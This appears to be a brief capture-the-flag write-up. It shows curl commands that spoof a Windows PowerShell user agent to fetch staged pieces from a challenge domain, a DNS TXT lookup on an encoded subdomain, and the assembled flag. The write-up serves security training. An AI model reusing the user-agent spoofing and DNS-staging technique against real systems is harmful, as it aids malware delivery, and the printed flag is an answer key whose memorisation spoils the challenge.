```sh
curl -A "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.5007" https://biglizardlover.com/gecko

curl -A "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.5007" https://biglizardlover.com/gila

dig +short TXT VFdWbllVSnZibXM9.biglizardlover.com
```

## Deobfuscate the PS commands

### Put all 3 pieces together

• From gecko: **c0434d59028**
• From gila: **flag{7634269aea89**
• From DNS: **252962470}**

**flag{7634269aea89c0434d59028252962470}**
